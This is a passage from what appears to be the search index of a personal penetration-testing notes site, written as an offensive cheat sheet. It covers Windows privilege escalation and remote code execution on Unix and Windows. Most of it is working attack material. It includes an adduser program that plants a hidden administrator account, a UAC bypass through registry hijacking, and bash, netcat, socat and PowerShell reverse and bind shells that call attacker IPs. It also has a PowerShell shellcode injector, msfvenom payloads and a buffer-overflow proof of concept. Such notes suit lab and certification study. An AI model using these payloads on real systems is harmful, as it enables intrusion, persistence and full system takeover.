Microsoft Corporation. All rights reserved.\n\nC:\\Users\\kostas\\Desktop&gt;whoami\nwhoami\nnt authority\\system\n</code></pre> <p>https://github.com/leecybersec/walkthrough/tree/master/hackthebox/006-optimum_httpfileserver-2.3_ms16-098-6.3.9600#rgnobj-integer-overflow</p>"},{"location":"network-pentest/privilege-escalation/Windows/#617600-ancillary-func-driver","title":"6.1.7600 Ancillary Func Driver","text":"<p>https://www.exploit-db.com/exploits/40564</p> <pre><code>c:\\windows\\system32\\inetsrv&gt;systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"\nOS Name:                   Microsoft Windows 7 Enterprise\nOS Version:                6.1.7600 N/A Build 7600\nSystem Type:               X86-based PC\n</code></pre> <pre><code>i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32\n</code></pre> <pre><code>c:\\Users\\Public&gt;40564.exe\n40564.exe\n\nc:\\Windows\\System32&gt;whoami\nwhoami\nnt authority\\system\n</code></pre> <p>Vulnerability in Ancillary Function Driver</p>"},{"location":"network-pentest/privilege-escalation/Windows/#windows-ms11-046-kernel","title":"Windows MS11-046 kernel","text":"<pre><code>c:\\Windows\\System32&gt;systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\nOS Name:                   Microsoftr Windows Serverr 2008 Standard \nOS Version:                6.0.6001 Service Pack 1 Build 6001\n</code></pre> <p>https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046</p> <pre><code>C:\\wamp\\www&gt;MS11-046.exe\nMS11-046.exe\n\nc:\\Windows\\System32&gt;whoami\nwhoami\nnt authority\\system\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#scheduled-tasks","title":"Scheduled Tasks","text":"<pre><code>schtasks /query /fo LIST /v\n</code></pre> <pre><code>schtasks /query /fo LIST /v | findstr /B /C:\"Task To Run\" /C:\"Next Run Time\" /C:\"Last Run Time\" /C:\"Schedule Type\" /C:\"Start Time\" /C:\"Start Date\"\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#readablewritable","title":"Readable/Writable","text":"<p>Using accesschk</p> <pre><code>accesschk.exe -accepteula\n</code></pre> <pre><code>accesschk.exe -uws &lt;user&gt; \"C:\\Program Files\"\n</code></pre> <p>Using powershell</p> <pre><code>Get-ChildItem \"C:\\Program Files\" -Recurse | Get-ACL | ?{$_.AccessToString -match \"Everyone\\sAllow\\s\\sModify\"}\n</code></pre> <pre><code>Get-ChildItem \"C:\\Users\\windows_10_1903_x64\\Desktop\" -Recurse | Get-ACL | findstr /C:\"&lt;user-name&gt;\"\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#processes-and-services","title":"Processes and Services","text":"<pre><code>tasklist /SVC\n</code></pre> <p>Active network connection</p> <pre><code>netstat -ano\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#insecure-file-permissions","title":"Insecure File Permissions","text":"<p>Get Server and Path to running</p> <p>Powershell &gt;&gt;&gt;</p> <pre><code>Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}\n</code></pre> Check permissionrefer icacls <pre><code>icacls \"C:\\Windows\\system32\\wbem\\WmiApSrv.exe\"\n</code></pre> <p>icacls</p> Mask Permissions F Full access M Modify access RX Read and execute access R Read-only access W Write-only access <p>Overwrite file if have F or W permission.</p> Compile code adduser.cadduser.c <pre><code>i686-w64-mingw32-gcc adduser.c -o adduser.exe\n</code></pre> <pre><code>#include &lt;stdlib.h&gt;\n\nint main ()\n{\n    int add;\n    add = system (\"net user backup Adm1nP@ssWD /add\");\n    add = system (\"net localgroup administrators backup /add\");\n    return 0;\n} \n</code></pre> <p>Move file <code>adduser.exe</code></p> <pre><code>move adduser.exe \"C:\\Program Files\\Serviio\\bin\\ServiioService.exe\"\n</code></pre> <p>Check StartMode for service</p> <pre><code>wmic service where caption=\"Serviio\" get name, caption, state, startmode\n</code></pre> <p>==&gt; StartMode: Auto</p> <p>Check rights for restart system</p> <pre><code>whoami /priv\n</code></pre> <p>Restart system</p> <pre><code>shutdown /r /t 0\n</code></pre> <p>Check Administrators group</p> <pre><code>net localgroup Administrators\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#insecure-service-permissions","title":"Insecure Service Permissions","text":"<pre><code>sc qc \"service\"\n</code></pre> <pre><code>accesschk64.exe -uwcqv &lt;user&gt; *\n</code></pre> <p>==&gt; <code>Service All Access</code> or <code>Service Change Config</code></p> <pre><code>sc config \"service\" binPath= \"net localgroup administrators user /add\"\n</code></pre> <pre><code>sc config \"service\" binPath= \"c:\\users\\public\\shell.exe\"\n</code></pre> <pre><code>sc stop \"service\"\n</code></pre> <pre><code>sc start \"service\"\n</code></pre> <p>https://asfiyashaikh.medium.com/windows-privesc-weak-service-permission-b90f3bf4d44f</p> <p>https://medium.com/@orhan_yildirim/windows-privilege-escalation-insecure-service-permissions-e4f33dbff219</p>"},{"location":"network-pentest/privilege-escalation/Windows/#leveraging-unquoted-paths","title":"Leveraging Unquoted Paths","text":"<pre><code>wmic service get displayname,pathname\n</code></pre> <pre><code>C:\\Program.exe\nC:\\Program Files\\My.exe\nC:\\Program Files\\My Program\\My.exe\nC:\\Program Files\\My Program\\My service\\service.exe\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#binaries-that-autoelevate","title":"Binaries That AutoElevate","text":""},{"location":"network-pentest/privilege-escalation/Windows/#alwaysinstallelevated","title":"AlwaysInstallElevated","text":"<p>https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated</p> <p>Enum commands</p> <pre><code>reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer\n</code></pre> <pre><code>reg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer\n</code></pre> <pre><code>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n</code></pre> <p>Exploit</p> <pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4567 -f msi &gt; /root/Desktop/1.msi\n</code></pre> <pre><code>msiexec /quiet /qn /i 1.msi\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#bypass-uac-registry-hijacking","title":"Bypass UAC registry hijacking","text":"<p>Check Mandatory Level</p> <pre><code>whoami /groups\n</code></pre> <p>Run cmd.exe as Administrator to get High Mandatory Level</p> <pre><code>powershell.exe Start-Process cmd.exe -Verb runAs\n</code></pre> <p><code>C:\\Windows\\System32\\fodhelper.exe</code></p> <pre><code>REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\n</code></pre> <pre><code>REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ\n</code></pre> <pre><code>REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"C:\\Users\\windows_10_1903_x64\\Desktop\\shell.exe\" /f\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#unmounted-disks","title":"Unmounted Disks","text":"<pre><code>mountvol\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#networking-enumeration","title":"Networking Enumeration","text":"<pre><code>ipconfig /all\n</code></pre> <pre><code>route print\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#firewall-status-and-rules","title":"Firewall Status and Rules","text":"<pre><code>netsh advfirewall show currentprofile\n</code></pre> <pre><code>netsh advfirewall firewall show rule name=all\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#enumeration-tools","title":"Enumeration Tools","text":"<p>windows-privesc-check</p> <pre><code>windows-privesc-check2.exe --help\n</code></pre> <p>winPEASexe</p> <pre><code>winPEASx86.exe\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#more-commands","title":"More commands","text":""},{"location":"network-pentest/privilege-escalation/Windows/#add-local-admin-user","title":"Add Local Admin User","text":"<pre><code>net user /add &lt;user&gt; &lt;pass&gt;\n</code></pre> <pre><code>net localgroup administrators &lt;user&gt; /add\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#run-cmd-as-admin","title":"Run CMD as Admin","text":"<pre><code>powershell.exe Start-Process cmd.exe -Verb runAs\n</code></pre>"},{"location":"network-pentest/privilege-escalation/Windows/#clear-text-stored","title":"Clear text stored","text":"<pre><code>reg query HKLM /f pass /t REG_SZ /s\n</code></pre>"},{"location":"network-pentest/remote-exploitation/Unix%26Linux/","title":"Unix Remote Code Execution","text":""},{"location":"network-pentest/remote-exploitation/Unix%26Linux/#msfvenom","title":"msfvenom","text":"<p>Shell File</p> <pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; shell.elf\n</code></pre> <p>Java Code</p> <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war\n</code></pre> <p>Shell Code</p> <pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=443 EXITFUNC=thread  -f c \u2013e x86/shikata_ga_nai -b \"&lt;badchars&gt;\"\n</code></pre> <p>Encoders</p> <pre><code>msfvenom  --list encoders\n</code></pre>"},{"location":"network-pentest/remote-exploitation/Unix%26Linux/#bash-reverse-shell","title":"Bash Reverse Shell","text":"<p>Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p> <pre><code>/bin/sh -c 'sh -i &gt; /dev/tcp/myip/443 0&gt;&amp;1 &amp;'\n</code></pre> <pre><code>/bin/sh -c 'sh -i &gt;&amp; /dev/tcp/myip/443 0&gt;&amp;1'\n</code></pre> <pre><code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/myip/443 0&gt;&amp;1'\n</code></pre> <pre><code>/bin/sh -c '0&lt;&amp;60-;exec 60&lt;&gt;/dev/tcp/myip/443;sh &lt;&amp;60 &gt;&amp;60 2&gt;&amp;60'\n</code></pre>"},{"location":"network-pentest/remote-exploitation/Unix%26Linux/#netcat-reverse-shell","title":"Netcat Reverse Shell","text":"<p>Kali machine</p> <pre><code>sudo nc -nlvp 443\n</code></pre> <p>Unix machine</p> <pre><code>nc -nv 192.168.11.130 443 -e /bin/sh\n</code></pre> <p>Netcat OpenBsd</p> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc myip 443 &gt;/tmp/f\n</code></pre> <p>Netcat BusyBox</p> <pre><code>rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc myip 443 &gt;/tmp/f\n</code></pre>"},{"location":"network-pentest/remote-exploitation/Unix%26Linux/#socat-reverse-shell","title":"Socat Reverse Shell","text":"<p>Kali machine</p> <pre><code>socat -d -d TCP4-LISTEN:443 STDOUT\n</code></pre> <p>Unix machine</p> <pre><code>socat TCP4:192.168.11.130:443 EXEC:/bin/sh\n</code></pre>"},{"location":"network-pentest/remote-exploitation/Unix%26Linux/#socat-encrypted-bind-shell","title":"Socat Encrypted Bind Shell","text":"<p>Create credential</p> <pre><code>openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out bind_shell.crt\ncat bind_shell.key bind_shell.crt &gt; bind_shell.pem\n</code></pre> <p>Unix machine</p> <pre><code>socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/sh\n</code></pre> <p>Kali machine</p> <pre><code>sudo socat OPENSSL:192.168.11.130:443,verify=0\n</code></pre>"},{"location":"network-pentest/remote-exploitation/Unix%26Linux/#nmap-nse-scripts-exploit","title":"Nmap NSE Scripts Exploit","text":"<pre><code>cd /usr/share/nmap/scripts\ngrep Exploits *.nse\nnmap --script-help=clamav-exec.nse\n</code></pre>"},{"location":"network-pentest/remote-exploitation/Unix%26Linux/#upgrade-shell","title":"Upgrade shell","text":"<pre><code>/usr/bin/python -c \"import pty; pty.spawn('/bin/bash')\"\nexport TERM=xterm\n</code></pre> <p>^Z</p> <pre><code>stty raw -echo; fg\n</code></pre> <pre><code>stty -a\n</code></pre> <pre><code>stty rows 41 columns 172\n</code></pre>"},{"location":"network-pentest/remote-exploitation/Unix%26Linux/#msfconsole-multi-handler","title":"msfconsole multi handler","text":"<pre><code>sudo msfconsole -x \"use exploit/multi/handler; set RHOST ip; set PAYLOAD windows/shell_reverse_tcp; set LHOST tun0; exploit\"\n</code></pre> <pre><code>processing AutoRunScript 'post/windows/manage/migrate'\n</code></pre>"},{"location":"network-pentest/remote-exploitation/Unix%26Linux/#payloadsallthethings","title":"PayloadsAllTheThings","text":""},{"location":"network-pentest/remote-exploitation/Unix%26Linux/#exploit-resources","title":"Exploit Resources","text":"OnlineOffline <p>Exploit Database</p> <p>SecurityFocus</p> <p>Packet Storm</p> <p>Reverse Shell Cheatsheet</p> <p>SearchSploit</p> <p>Metasploit Framework</p> <p>BeEF</p>"},{"location":"network-pentest/remote-exploitation/windows/","title":"Windows Remote Code Execution","text":""},{"location":"network-pentest/remote-exploitation/windows/#powershell","title":"PowerShell","text":"<p>Encoded Payload</p> <p>File <code>reverse_shell_cleartext.ps1</code></p> <pre><code>$client = New-Object System.Net.Sockets.TCPClient('192.168.11.130',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n</code></pre> <p>Encode payload and copy it to clipboard</p> <pre><code>cat reverse_shell_cleartext.ps1 | iconv -t UTF-16LE | base64 -w 0 | cs\n</code></pre> <p>Execute payload from clipboard</p> <pre><code>powershell -enc $(vs)\n</code></pre> <p>Reverse Shell</p> <p>Kali machine</p> <pre><code>sudo nc -nlvp 443\n</code></pre> <p>Windows machine</p> <pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.11.130',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre> <p>Bind Shell</p> <p>Kali machine</p> <pre><code>nc -nv 192.168.11.131 443\n</code></pre> <p>Windows machine</p> <pre><code>powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' +(pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\"\n</code></pre> <p>Unrestricted and XClipborad</p> <pre><code>Set-ExecutionPolicy Unrestricted\nGet-ExecutionPolicy\n</code></pre> <p>Install XClipboard</p> <pre><code>sudo apt install xclip\n</code></pre> <p>Alias XClipboard command with short character.</p> <pre><code>alias \"cs=xclip -selection clipboard\"\nalias \"vs=xclip -o -selection clipboard\"\n</code></pre> <p>In-memory payload injection script</p> <pre><code>$code = '\n[DllImport(\"kernel32.dll\")]\npublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n[DllImport(\"kernel32.dll\")]\npublic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n[DllImport(\"msvcrt.dll\")]\npublic static extern IntPtr memset(IntPtr dest, uint src, uint count);';\n\n$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru;\n\n[Byte[]];\n[Byte[]]$sc = &lt;place your shellcode here&gt;;\n\n$size = 0x1000;\n\nif ($sc.Length -gt 0x1000) {$size = $sc.Length};\n\n$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);\n\nfor ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};\n\n$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };\n</code></pre>"},{"location":"network-pentest/remote-exploitation/windows/#powercat","title":"Powercat","text":"<p>Create Environment</p> <p>Windows machine</p> <pre><code>. .\\powercat.ps1\n</code></pre> <pre><code>iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')\n</code></pre> <p>Kali machine</p> <pre><code>sudo apt install powercat\ncat /usr/share/windows-resources/powercat/powercat.ps1\n</code></pre> <p>Reverse Shell</p> <p>Kali machine</p> <pre><code>sudo nc -nlvp 443\n</code></pre> <p>Windows machine</p> <pre><code>powercat -c 192.168.11.130 -p 443 -e cmd.exe\n</code></pre> <p>Stand-Alone Payloads</p> <p>Kali machine</p> <pre><code>sudo nc -nlvp 443\n</code></pre> <p>Windows machine</p> <pre><code>powercat -c 192.168.11.130 -p 443 -e cmd.exe -g &gt; shell.ps1\n\n.\\shell.ps1\n</code></pre> <p>Encoded Payloads</p> <p>Kali machine</p> <pre><code>sudo nc -nlvp 443\n</code></pre> <p>Windows machine</p> <pre><code>powercat -c 192.168.11.130 -p 443 -e cmd.exe -ge &gt; encoded_shell.ps1\n</code></pre> <pre><code>powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0A...pAAoACgA=\n</code></pre> <p>Bind Shell</p> <p>Kali machine</p> <pre><code>nc -nv 192.168.11.131 443\n</code></pre> <p>Windows machine</p> <pre><code>powercat -l -p 443 -e cmd.exe\n</code></pre>"},{"location":"network-pentest/remote-exploitation/windows/#netcat","title":"Netcat","text":"<p>Packed File</p> <pre><code>upx -9 nc.exe\n</code></pre> <p>Reverse Shell</p> <p>Kali machine</p> <pre><code>sudo nc -nlvp 443\n</code></pre> <p>Windows machine</p> <pre><code>nc -nv 192.168.11.130 443 -e cmd.exe\n</code></pre> <p>Bind Shell</p> <p>Kali machine</p> <pre><code>nc -nv 192.168.11.131 443\n</code></pre> <p>Windows machine</p> <pre><code>nc -nlvp 443 -e cmd.exe\n</code></pre>"},{"location":"network-pentest/remote-exploitation/windows/#socat","title":"Socat","text":"<p>Reverse Shell</p> <p>Kali machine</p> <pre><code>socat -d -d TCP4-LISTEN:443 STDOUT\n</code></pre> <p>Windows machine</p> <pre><code>socat TCP4:192.168.11.130:443 EXEC:cmd.exe\n</code></pre> <p>Encrypted Bind Shell</p> <p>Create credential</p> <pre><code>openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out bind_shell.crt\ncat bind_shell.key bind_shell.crt &gt; bind_shell.pem\n</code></pre> <p>Windows machine</p> <pre><code>socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:cmd.exe\n</code></pre> <p>Kali machine</p> <pre><code>sudo socat OPENSSL:192.168.11.130:443,verify=0\n</code></pre>"},{"location":"network-pentest/remote-exploitation/windows/#remote-desktop","title":"Remote desktop","text":"<pre><code>rdesktop $ip -u Tester -p Pass\n</code></pre> <pre><code>xfreerdp /f /u:Tester /p:&lt;Pass&gt; /v:192.168.0.101 /drive:D,/tmp\n</code></pre>"},{"location":"network-pentest/remote-exploitation/windows/#build-windows-binary-file","title":"Build Windows Binary File","text":"<pre><code>i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32\n</code></pre> <pre><code>wine32 syncbreeze_exploit.exe\n</code></pre>"},{"location":"network-pentest/remote-exploitation/windows/#msfconsole-multi-handler","title":"msfconsole multi handler","text":"<pre><code>sudo msfconsole -x \"use exploit/multi/handler; set RHOST ip; set PAYLOAD windows/shell_reverse_tcp; set LHOST tun0; exploit\"\n</code></pre> <pre><code>processing AutoRunScript 'post/windows/manage/migrate'\n</code></pre>"},{"location":"network-pentest/remote-exploitation/windows/#nmap-nse-scripts-exploit","title":"Nmap NSE Scripts Exploit","text":"<pre><code>cd /usr/share/nmap/scripts\ngrep Exploits *.nse\nnmap --script-help=clamav-exec.nse\n</code></pre>"},{"location":"network-pentest/remote-exploitation/windows/#payloadsallthethings","title":"PayloadsAllTheThings","text":""},{"location":"network-pentest/remote-exploitation/windows/#exploit-resources","title":"Exploit Resources","text":"OnlineOfflineShell FileJava CodeShell CodeEncoders <p>Exploit Database</p> <p>SecurityFocus</p> <p>Packet Storm</p> <p>Metasploit Framework</p> <p>BeEF</p> <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe\n</code></pre> <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war\n</code></pre> <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=443 EXITFUNC=thread  -f c \u2013e x86/shikata_ga_nai -b \"&lt;badchars&gt;\"\n</code></pre> <pre><code>msfvenom  --list encoders\n</code></pre>"},{"location":"network-pentest/scanning/","title":"Scanning","text":"<p>Scripting here</p>"},{"location":"network-pentest/scanning/#network-sweeping","title":"Network Sweeping","text":"pingnmapnetdiscover <pre><code>#!/bin/bash\n\nif [ -z $1 ]; then\n    echo \"Usage: $0 &lt;SubIP&gt;\"\n    exit\nfi\n\nfor ip in $(seq 1 254); do\n   ping -c 1 $1.$ip | grep \"bytes from\" | cut -d \" \" -f 4 | cut -d \":\" -f 1 &amp;\ndone\n</code></pre> <pre><code>nmap -sn 192.168.11.0/24\n</code></pre> <pre><code>netdiscover -r 192.168.11.0/24\n</code></pre>"},{"location":"network-pentest/scanning/#open-port-scanning","title":"Open Port Scanning","text":"NetcatMasscanNmap <p>TCP</p> <pre><code>nc -nv -w 1 -z $ip 1-65535\n</code></pre> <p>UDP</p> <pre><code>nc -nv -w 1 -z -u $ip 1-65535\n</code></pre> <p>TCP</p> <pre><code>sudo masscan -i tun0 $ip -p0-65535 --rate 1000\n</code></pre> <pre><code>sudo masscan -p80 192.168.11.0/24\n</code></pre> <p>UDP</p> <pre><code>masscan -pU 53 $ip\n</code></pre> <p>Quick scan</p> <pre><code>nmap --top-port 100 $ip\n</code></pre> <p>Grep ports</p> <pre><code>ports=$(nmap -p- --min-rate 1000 $ip | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$//)\n</code></pre> <p>TCP connect scan (-sT) takes much longer to complete than SYN scan (-sS).</p> <p>SYN Scan</p> <pre><code>sudo nmap -sS -p- $ip\n</code></pre> <p>TCP Connect Scan</p> <pre><code>sudo nmap -sT -p- $ip\n</code></pre> <p>UDP Scan</p> <pre><code>sudo nmap -sU -p- $ip\n</code></pre>"},{"location":"network-pentest/scanning/#service-enumeration","title":"Service Enumeration","text":"<p>Common Services</p> <pre><code>nmap -sC -sV -p$ports $ip\n</code></pre> <pre><code>nmap -sC -sV -A -p$ports $ip\n</code></pre>"},{"location":"network-pentest/scanning/#os-fingerprinting","title":"OS Fingerprinting","text":"<pre><code>sudo nmap -O $ip\n</code></pre>"},{"location":"network-pentest/scanning/#nse-scripts","title":"NSE Scripts","text":"<p>vuln</p> <pre><code>sudo nmap --script=vuln $ip\n</code></pre> <p>smb-os-discovery</p> <pre><code>sudo nmap --script=smb-os-discovery $ip\n</code></pre> <p>smb-vul*</p> <pre><code>sudo nmap --script smb-vul* -p 139,445 $ip\n</code></pre> <p>ms-sql-brute</p> <pre><code>sudo nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt &lt;host&gt;\n</code></pre> <p>dns-zone-transfer</p> <pre><code>sudo nmap --script=dns-zone-transfer -p 53 leecybersec.com\n</code></pre>"},{"location":"network-pentest/scanning/#nmap-cheat-sheet","title":"Nmap Cheat Sheet","text":""},{"location":"red-teaming/","title":"Index","text":"<p>body {   background-image: url('../images/bg.jpg');   background-size: cover;   background-position: center;   background-repeat: no-repeat;   background-attachment: fixed;   font-family: Arial, sans-serif; }</p> <p>Unix-basics</p> <p>Basic Commands</p> <p>Basic Terminal</p> <p>Active-directory</p> <p>Enumeration</p> <p>Exploit-development</p> <p>Buffer Overflow</p>"},{"location":"red-teaming/exploit-dev/buffer-overflow/","title":"Buffer Overflow","text":""},{"location":"red-teaming/exploit-dev/buffer-overflow/#pocpy","title":"poc.py","text":"<pre><code>#!/usr/bin/python\n\nimport sys, socket\n\nif len(sys.argv) &lt; 2:\n    print \"\\nUsage: \" + sys.argv[0] + \" &lt;ip&gt;\\n\"\n    sys.exit()\n\njunk = \"\\x41\" * # number\n\neip = \"\" # jmp esp\n\nnop = \"\\x90\" * 8\n\nshell = ()\n\nbuffer = junk + eip + nop + shell\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 (AF_INET), TCP (SOCK_STREAM)\ns.connect((sys.argv[1], 9001))\ns.send(buffer)\ns.recv(1024)\ns.close()\n</code></pre>"},{"location":"red-teaming/exploit-dev/buffer-overflow/#offset","title":"Offset","text":"<p>Create pattern for juck value</p> <pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l &lt;number&gt;\n</code></pre> <p>Identify the offset</p> <pre><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q &lt;value&gt;\n</code></pre>"},{"location":"red-teaming/exploit-dev/buffer-overflow/#go-to-esp","title":"Go to esp","text":"<p><code>Install mona</code>: https://github.com/corelan/mona</p> <pre><code>!mona modules\n</code></pre> <p><code>assembly to hex converter</code>: https://defuse.ca/online-x86-assembler.htm</p>"},{"location":"red-teaming/exploit-dev/buffer-overflow/#jmp-esp","title":"JMP ESP","text":"<pre><code>!mona find -s \"\\xff\\xe4\" -m \"app.dll\"\n</code></pre>"},{"location":"red-teaming/exploit-dev/buffer-overflow/#call-esp","title":"CALL ESP","text":"<pre><code>!mona find -s \"\\xff\\xd4\" -m \"app.dll\"\n</code></pre>"},{"location":"red-teaming/exploit-dev/buffer-overflow/#push-esp-ret","title":"PUSH ESP --&gt; RET","text":"<pre><code>!mona find -s \"\\x54\\xc3\" -m \"app.dll\"\n</code></pre> <p>https://www.rcesecurity.com/2011/12/buffer-overflow-exploitation-jump-to-shellcode-via-push-espret</p>"},{"location":"red-teaming/exploit-dev/buffer-overflow/#locate-payload","title":"Locate payload","text":"<pre><code>nop = \"\\x90\" * 4\n</code></pre>"},{"location":"red-teaming/exploit-dev/buffer-overflow/#badchars","title":"Badchars","text":"<pre><code>\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\n\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\n\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\n\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\n\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\n\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\n\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\n\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\n\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\n\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\n\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\n\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\n\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\